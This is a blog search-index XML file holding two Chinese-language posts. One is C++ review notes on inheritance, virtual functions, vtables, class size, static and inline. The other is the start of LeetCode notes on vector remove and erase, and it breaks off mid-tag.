<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>cpp复习</title>
    <link href="/2024/07/22/cpp%E5%A4%8D%E4%B9%A0/"/>
    <url>/2024/07/22/cpp%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="C-知识"><a href="#C-知识" class="headerlink" title="C++知识"></a>C++知识</h1><h2 id="C-三大特性"><a href="#C-三大特性" class="headerlink" title="C++三大特性"></a>C++三大特性</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装：一种将抽象性函数接口的实现细节部分包装、隐藏起来的方法。同时，它也是一种防止外界调用端，去访问对象内部实现细节的手段，这个手段是由编程语言本身来提供的。</p><ul><li>让代码易于理解、修改；</li><li>加强代码的安全性。</li></ul><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承：继承可以使得子类具有父类别的各种属性和方法，而不需要再次编写相同的代码。在令子类别继承父类别的同时，可以重新定义某些属性，并重写某些方法，即覆盖父类别的原有属性和方法，使其获得与父类别不同的功能。</p><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>在现实生活中，一些新事物往往会拥有两个或者两个以上事物的属性，为了解决这个问题，C++引入了多重继承的概念，C++允许为一个派生类指定多个基类，这样的继承结构被称做多重继承。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base1, <span class="hljs-keyword">public</span> Base2, … &#123;&#125;；<br></code></pre></td></tr></table></figure><p>对于以下的多重继承：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BC0</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> K;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BC1</span> : <span class="hljs-keyword">public</span> BC0<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> x;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BC2</span> : <span class="hljs-keyword">public</span> BC0<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> x;<br>&#125;;<br><span class="hljs-keyword">class</span>  <span class="hljs-title class_">DC</span> : <span class="hljs-keyword">public</span> BC1, <span class="hljs-keyword">public</span> BC2&#123;<br>&#125;;<br></code></pre></td></tr></table></figure><p>有两个问题：</p><ul><li>类DC的对象中，存在两份来自类BC0的成员K，如何区分？</li><li>类DC的对象中存在多个同名成员 x， 应如何使用？</li></ul><p>正确访问方式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">( )</span></span><br><span class="hljs-function"></span>&#123;<br>    DC d;<br>    d.x = <span class="hljs-number">1</span>;       <span class="hljs-comment">// error C2385: 对&quot;x&quot;的访问不明确</span><br>         <span class="hljs-comment">//可能是&quot;x&quot;(位于基&quot;BC1&quot;中)，也可能是&quot;x&quot;(位于基&quot;BC2&quot;中)</span><br>    d.BC1::x = <span class="hljs-number">2</span>;   <span class="hljs-comment">// OK，from BC1</span><br>    d.BC2::x = <span class="hljs-number">3</span>;   <span class="hljs-comment">// OK，from BC2</span><br>    d.K = <span class="hljs-number">4</span>;           <span class="hljs-comment">// error C2385: 对&quot;K&quot;的访问不明确</span><br>    d.BC1::K = <span class="hljs-number">5</span>;  <span class="hljs-comment">// OK，from BC1</span><br>    d.BC2::K = <span class="hljs-number">6</span>;  <span class="hljs-comment">// OK，from BC2</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h4><p>我们若只想保留一份上述例子中的K，则需要在BC1类和BC2类继承BC0时，其前面加上virtual关键字就可以实现虚拟继承，使用虚拟继承后，<strong>当系统碰到多重继承的时候就会先自动加一个BC0的拷贝，当再次请求一个BC0的拷贝时就会被忽略，以保证继承类成员函数的唯一性。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BC0</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> K;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BC1</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> BC0<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> x;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BC2</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> BC0<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> x;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DC</span> : <span class="hljs-keyword">public</span> BC1, <span class="hljs-keyword">public</span> BC2<br>&#123;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">( )</span></span><br><span class="hljs-function"></span>&#123;<br>    DC d;       <span class="hljs-comment">//虚继承使得BC0仅被DC间接继承一份</span><br>    d.K = <span class="hljs-number">13</span>;    <span class="hljs-comment">// OK</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>虚继承后，子类会存在一个虚函数指针占4字节。</li><li>继承相关的内存大小需细化</li></ul><h2 id="virtual关键字"><a href="#virtual关键字" class="headerlink" title="virtual关键字"></a>virtual关键字</h2><p>在 C++ 中，虚函数（virtual function）是一个可以被子类重写的成员函数，而纯虚函数（pure virtual function）是一个在基类中声明的虚函数，但不会在基类中实现，而是要求派生类中实现的函数。</p><p>区别如下：</p><ol><li>虚函数是有实现的，而纯虚函数没有实现。虚函数在基类中有默认实现，子类可以重写它，也可以不重写，但纯虚函数必须在子类中实现。</li><li>如果一个类中包含至少一个纯虚函数，那么这个类就是抽象类，不能直接实例化对象。而虚函数不会强制一个类成为抽象类。</li><li>调用纯虚函数会导致链接错误，除非在派生类中实现该函数。而虚函数可以被调用，如果派生类没有重写该函数，将调用基类的实现。</li><li>纯虚函数可以为接口提供一个规范，子类必须实现这些接口。而虚函数则允许子类通过重写来扩展或修改父类的实现。</li><li>纯虚函数只能在抽象类中声明，而虚函数可以在任何类中声明</li></ol><h3 id="运行时多态"><a href="#运行时多态" class="headerlink" title="运行时多态"></a>运行时多态</h3><ul><li><p>如果父类函数未使用virtual关键字，则调用子类函数时，默认调用父类写好的函数。即静态绑定。在删除时, 只会调用基类的析构函数, 而不会调用子类的析构函数. 如果将指针的类型声明为子类类型, 那么调用顺序是先调用子类的析构函数, 再调用基类的析构函数.</p></li><li><p>加入了virtual的函数,一个类中函数的调用并不是在编译的时候决定下来的,而是在运行时候被确定的,这也就是虚函数.</p></li></ul><h3 id="虚函数表和虚函数指针"><a href="#虚函数表和虚函数指针" class="headerlink" title="虚函数表和虚函数指针"></a>虚函数表和虚函数指针</h3><p>C++ 中虚函数这种多态的性质是通过虚函数表指针和一张虚函数表来实现的：</p><ul><li>vptr(虚函数表指针, 占 4 个字节): 一个指向虚函数表的指针，<strong>每个对象</strong> 都会拥有这样的一个指针. C++ 的编译器将虚函数表指针存放在对象实例中最前面的位置, 这是为了保证取得虚函数表时具有最高的性能.</li><li>vtable(虚函数表): 每一个含有虚函数的类都会维护一个虚函数表，里面按照声明顺序记录了该类的全部虚函数的地址</li></ul><p>在进行虚函数的调用时, 编译器会根据基类指针所指向(或者基类引用所引用)的对象中的虚函数表指针找到该类的虚函数表, 然后在虚函数表中查找要调用的虚函数的地址</p><p>通常情况下，编译器在下面两处地方添加额外的代码来维护和使用虚函数表指针：</p><ol><li>在每个构造函数中。此处添加的代码会设置被创建对象的虚函数表指针指向对应类的虚函数表</li><li><strong>在每次进行多态函数调用时。 无论何时调用了多态函数，编译器都会首先查找vptr指向的地址（也就是指向对象对应的类的虚函数表），一旦找到后，就会使用该地址内存储的函数（而不是基类的函数）</strong>。</li></ol><h3 id="为什么虚函数表指针的类型为void"><a href="#为什么虚函数表指针的类型为void" class="headerlink" title="为什么虚函数表指针的类型为void *"></a>为什么虚函数表指针的类型为<code>void *</code></h3><p>因为对于虚函数表来说, 一个类中的所有虚函数都会放到这个表中, 但是不同的虚函数对应的函数指针类型各不相同, 所以这个表的类型也就无法确定.</p><h3 id="为什么虚函数表前要加const"><a href="#为什么虚函数表前要加const" class="headerlink" title="为什么虚函数表前要加const"></a>为什么虚函数表前要加<code>const</code></h3><p>因为虚函数表是在编译时, 由编译器自动生成的, 并且不会发生改变, 当有多个B类的实例时, 每个实例都会维护一个虚函数表指针, 但是这些指针指向的都是同一个虚函数表, 该表是一个常量表.</p><h3 id="类的-size-与虚函数"><a href="#类的-size-与虚函数" class="headerlink" title="类的 size 与虚函数"></a>类的 size 与虚函数</h3><ul><li>类中的普通函数，都是不占用类空间的。</li><li>普通函数只是一种表示, 其本身并不会占有任何内存；</li><li>如果类中没有任何变量或者虚函数时, 类的 size 不会为1, 而是会自动插入一个字节, 并且在类的 size 大于1的时候, 该字节会被覆盖掉；</li><li>类的指针大小为8字节；</li><li>继承时，子类的大小为父类之和，加上子类的自有元素。</li><li>关于对齐：变量存放的起始地址相对于结构的起始地址的偏移量必须为某个数值的倍数. 同时会根据当前结构中的<strong>元素的最大字节数</strong>将总的 size 补成最大字节数的倍数</li></ul><p>对齐：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span>::std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>&#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Car</span>()&#123;<br>      cout&lt;&lt;<span class="hljs-string">&quot;Car constructor&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    ~<span class="hljs-built_in">Car</span>()&#123;<br>      cout&lt;&lt;<span class="hljs-string">&quot;Car destructor&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">start</span><span class="hljs-params">()</span> </span>&#123;<br>      cout&lt;&lt;<span class="hljs-string">&quot;car start&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">stop</span><span class="hljs-params">()</span> </span>&#123;<br>      cout&lt;&lt;<span class="hljs-string">&quot;car stop&quot;</span>&lt;&lt;endl;<br>    &#125;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-type">int</span> speed1;<br>    <span class="hljs-type">int</span> speed2;<br>    <span class="hljs-type">int</span> speed3;<br>    <span class="hljs-type">int</span> speed4;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span></span>&#123;<br>  Car *p_car = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Car</span>();<br>  Car car;<br>  cout&lt;&lt; <span class="hljs-function">size <span class="hljs-title">of</span><span class="hljs-params">(Car)</span>&lt;&lt;endl</span>; <span class="hljs-comment">// 类的 size</span><br>  cout&lt;&lt; <span class="hljs-function">size <span class="hljs-title">of</span><span class="hljs-params">(car)</span>&lt;&lt;endl</span>; <span class="hljs-comment">// 对象的 size</span><br>  cout&lt;&lt; <span class="hljs-function">size <span class="hljs-title">of</span><span class="hljs-params">(p_car)</span>&lt;&lt;endl</span>; <span class="hljs-comment">// 对象指针的 size</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出并非17个字节，而是：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Car <span class="hljs-function"><span class="hljs-keyword">constructor</span></span><br><span class="hljs-function"><span class="hljs-title">Car</span> <span class="hljs-title">constructor</span></span><br><span class="hljs-function">20</span><br><span class="hljs-function">20</span><br><span class="hljs-function">8</span><br><span class="hljs-function"><span class="hljs-title">Car</span> <span class="hljs-title">destructor</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>20个字节，因为char向更大的int对齐。</p><h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><p>C++的static有两种用法：面向过程程序设计中的static和面向对象程序设计中的static。前者应用于普通变量和函数，不涉及类；后者主要说明static在类中的作用。</p><h3 id="面向过程的static"><a href="#面向过程的static" class="headerlink" title="面向过程的static"></a>面向过程的static</h3><h4 id="静态全局变量"><a href="#静态全局变量" class="headerlink" title="静态全局变量"></a>静态全局变量</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fn</span><span class="hljs-params">()</span></span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> n; <span class="hljs-comment">//定义静态全局变量</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br> 　　n=<span class="hljs-number">20</span>;<br> 　　cout&lt;&lt;n&lt;&lt;endl;<br> 　　<span class="hljs-built_in">fn</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>静态全局变量特点如下：</p><ul><li>该变量在<strong>全局数据区</strong>分配内存；</li><li>未经初始化的静态全局变量会被程序自动初始化为0；</li><li>静态全局变量在声明它的整个文件都是可见的，而在文件之外是不可见的；</li></ul><p>定义全局变量就可以实现变量在文件中的共享，但定义静态全局变量还有以下好处：</p><ul><li>静态全局变量<strong>不能</strong>被其它文件所用；</li><li>其它文件中可以定义相同名字的变量，<strong>不会发生冲突</strong>；</li></ul><h4 id="静态局部变量"><a href="#静态局部变量" class="headerlink" title="静态局部变量"></a>静态局部变量</h4><p>通常，在函数体内定义了一个变量，每当程序运行到该语句时都会给该局部变量分配栈内存。但随着程序退出函数体，系统就会收回栈内存，局部变量也相应失效。但有时候我们需要在两次调用之间对变量的值进行保存。通常的想法是定义一个全局变量来实现。但这样一来，变量已经不再属于函数本身了，不再仅受函数的控制，给程序的维护带来不便。<br>静态局部变量正好可以解决这个问题。<strong>静态局部变量保存在全局数据区</strong>，而不是保存在栈中，<strong>每次的值保持到下一次调用，直到下次赋新值</strong>。</p><p>静态局部变量特点如下：</p><ul><li>在全局数据区分配内存；</li><li>静态局部变量在程序执行到该对象的声明处时被首次初始化，即以后的函数调用不再进行初始化；</li><li>静态局部变量一般在声明处初始化，如果没有显式初始化，会被程序自动初始化为0；</li><li>它始终驻留在全局数据区，直到程序运行结束。但其<strong>作用域为局部作用域</strong>，当定义它的函数或语句块结束时，其作用域随之结束；</li></ul><h4 id="静态函数"><a href="#静态函数" class="headerlink" title="静态函数"></a>静态函数</h4><ul><li>仅能被该文件内使用。</li></ul><h3 id="面向对象的static关键字"><a href="#面向对象的static关键字" class="headerlink" title="面向对象的static关键字"></a>面向对象的static关键字</h3><h4 id="静态数据成员"><a href="#静态数据成员" class="headerlink" title="静态数据成员"></a>静态数据成员</h4><ul><li>对于非静态数据成员，每个类对象都有自己的拷贝。而静态数据成员被当作是类的成员。无论这个类的对象被定义了多少个，静态数据成员在程序中也只有一份拷贝，由该类型的所有对象共享访问。也就是说，静态数据成员是该类的所有对象所共有的。对该类的多个对象来说，静态数据成员只分配一次内存，供所有对象共用。所以，静态数据成员的值对每个对象都是一样的，它的值可以更新；</li><li>静态数据成员存储在全局数据区。静态数据成员定义时要分配空间，<strong>所以不能在类声明中定义</strong>。在Example 5中，语句int Myclass::Sum=0;是定义静态数据成员</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream.h&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br> 　　<span class="hljs-built_in">Myclass</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c);<br> 　　<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GetSum</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">private</span>:<br> 　　<span class="hljs-type">int</span> a,b,c;<br> 　　<span class="hljs-type">static</span> <span class="hljs-type">int</span> Sum;<span class="hljs-comment">//声明静态数据成员</span><br>&#125;;<br><span class="hljs-type">int</span> Myclass::Sum=<span class="hljs-number">0</span>;<span class="hljs-comment">//定义并初始化静态数据成员</span><br></code></pre></td></tr></table></figure><ul><li>因为静态数据成员在全局数据区分配内存，属于本类的所有对象共享，所以，它不属于特定的类对象，在没有产生类对象时其作用域就可见，即在没有产生类的实例时，我们就可以操作它；</li><li>静态数据成员初始化与一般数据成员初始化不同。静态数据成员初始化的格式为：<br>＜数据类型＞＜类名＞::＜静态数据成员名＞=＜值＞</li><li>类的静态数据成员有两种访问形式：<br>＜类对象名＞.＜静态数据成员名＞ 或 ＜类类型名＞::＜静态数据成员名＞</li><li>同全局变量相比，使用静态数据成员有两个优势：<br>\1. 静态数据成员没有进入程序的全局名字空间，因此不存在与程序中其它全局名字冲突的可能性；<br>\2. 可以实现信息隐藏。静态数据成员可以是private成员，而全局变量不能；</li></ul><h4 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h4><p>与静态数据成员一样，我们也可以创建一个静态成员函数，它为类的全部服务而不是为某一个类的具体对象服务。静态成员函数与静态数据成员一样，都是类的内部实现，属于类定义的一部分。普通的成员函数一般都隐含了一个this指针，this指针指向类的对象本身，因为普通成员函数总是具体的属于某个类的具体对象的。通常情况下，this是缺省的。如函数fn()实际上是this-&gt;fn()。但是与普通函数相比，静态成员函数由于不是与任何的对象相联系，因此它不具有this指针。从这个意义上讲，它无法访问属于类对象的非静态数据成员，也无法访问非静态成员函数，它只能调用其余的静态成员函数。下面举个静态成员函数的例子。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//Example 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream.h&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br> 　　<span class="hljs-built_in">Myclass</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c);<br> 　　<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">GetSum</span><span class="hljs-params">()</span></span>;/声明静态成员函数<br><span class="hljs-keyword">private</span>:<br> 　　<span class="hljs-type">int</span> a,b,c;<br>　　 <span class="hljs-type">static</span> <span class="hljs-type">int</span> Sum;<span class="hljs-comment">//声明静态数据成员</span><br>&#125;;<br><span class="hljs-type">int</span> Myclass::Sum=<span class="hljs-number">0</span>;<span class="hljs-comment">//定义并初始化静态数据成员</span><br><br>Myclass::<span class="hljs-built_in">Myclass</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)<br>&#123;<br> 　　<span class="hljs-keyword">this</span>-&gt;a=a;<br> 　　<span class="hljs-keyword">this</span>-&gt;b=b;<br> 　　<span class="hljs-keyword">this</span>-&gt;c=c;<br> 　　Sum+=a+b+c; <span class="hljs-comment">//非静态成员函数可以访问静态数据成员</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Myclass::GetSum</span><span class="hljs-params">()</span> <span class="hljs-comment">//静态成员函数的实现</span></span><br><span class="hljs-function"></span>&#123;<br>　　<span class="hljs-comment">// cout&lt;&lt;a&lt;&lt;endl; //错误代码，a是非静态数据成员</span><br> 　　cout&lt;&lt;<span class="hljs-string">&quot;Sum=&quot;</span>&lt;&lt;Sum&lt;&lt;endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br> 　　<span class="hljs-function">Myclass <span class="hljs-title">M</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)</span></span>;<br> 　　M.<span class="hljs-built_in">GetSum</span>();<br> 　　<span class="hljs-function">Myclass <span class="hljs-title">N</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)</span></span>;<br> 　　N.<span class="hljs-built_in">GetSum</span>();<br> 　　Myclass::<span class="hljs-built_in">GetSum</span>();<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>静态成员之间可以相互访问，包括静态成员函数访问静态数据成员和访问静态成员函数；</li><li>非静态成员函数可以任意地访问静态成员函数和静态数据成员；</li><li>静态成员函数不能访问非静态成员函数和非静态数据成员；</li><li>由于没有this指针的额外开销，因此静态成员函数与类的全局函数相比速度上会有少许的增长；</li><li>调用静态成员函数，可以用成员访问操作符(.)和(-&gt;)为一个类的对象或指向类对象的指针调用静态成员函数，也可以直接使用如下格式：<br>＜类名＞::＜静态成员函数名＞（＜参数表＞）<br>调用类的静态成员函数。</li></ul><p>总而言之，面向对象的static关键字，主要是为整个类服务，而不是类抽象出的对象。</p><h2 id="inline-关键字"><a href="#inline-关键字" class="headerlink" title="inline 关键字"></a>inline 关键字</h2><p>inline关键字是编译关键字，<strong>其作用是将函数展开，把函数的代码复制到每一个调用处</strong>。这样调用函数的过程就可以直接执行函数代码，而不发生跳转、压栈等一般性函数操作。可以节省时间，也会提高程序的执行速度。</p><ul><li>关键字inline必须与函数的定义体放在一起，才能使函数成为内联函数；仅仅将inline放在函数声明前面不起作用；</li><li>inline只适合函数体内代码比较简单的函数使用，不能包含复杂的结构控制语句；</li><li>inline仅是一个对编译器的建议；</li><li>建议inline的函数定义放在头文件里；</li><li>慎用inline；内联能提高函数的执行效率，内联是以代码膨胀（复制）为代价，仅仅省去了函数调用的开销，从而提高函数的执行效率。 如果执行函数体内代码的时间，相比于函数调用的开销较大，那么效率的收获会很少。另一方面，每一处内联函数的调用都要复制代码，将使程序的总代码量增大，消耗更多的内存空间。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>LeetCode practice</title>
    <link href="/2024/07/10/LeetCode-practice/"/>
    <url>/2024/07/10/LeetCode-practice/</url>
    
    <content type="html"><![CDATA[<h1 id="LeetCode-刷题"><a href="#LeetCode-刷题" class="headerlink" title="LeetCode 刷题"></a>LeetCode 刷题</h1><p>本篇文章将持续更新，刷题过程的思路、语言的底层原理等细节。</p><h2 id="vector的erase操作与remove操作"><a href="#vector的erase操作与remove操作" class="headerlink" title="vector的erase操作与remove操作"></a>vector的erase操作与remove操作</h2><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><ul><li>remove的实现方式是用被删除对象的后一个对象将其覆盖。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; demo&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-comment">// 覆盖要删除的元素， remove 后元素应该如右所示 1 4 5 4 3 5</span><br>    <span class="hljs-keyword">auto</span> iter = std::<span class="hljs-built_in">remove</span>(demo.<span class="hljs-built_in">begin</span>(), demo.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> first = demo.<span class="hljs-built_in">begin</span>(); first &lt; demo.<span class="hljs-built_in">end</span>(); ++first)<br>    &#123;<br>        cout &lt;&lt; *first &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;size is :&quot;</span> &lt;&lt; demo.<span class="hljs-built_in">size</span>() &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;capacity is :&quot;</span> &lt;&lt; demo.<span class="hljs-built_in">capacity</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 1 4 5 4 3 5</span><br><span class="hljs-comment">// size is :6</span><br><span class="hljs-comment">// capacity is :6</span><br><br></code></pre></td></tr></table></figure><p>remove会返回一个迭代器，代表新向量的结尾。</p><h3 id="erase"><a href="#erase" class="headerlink" 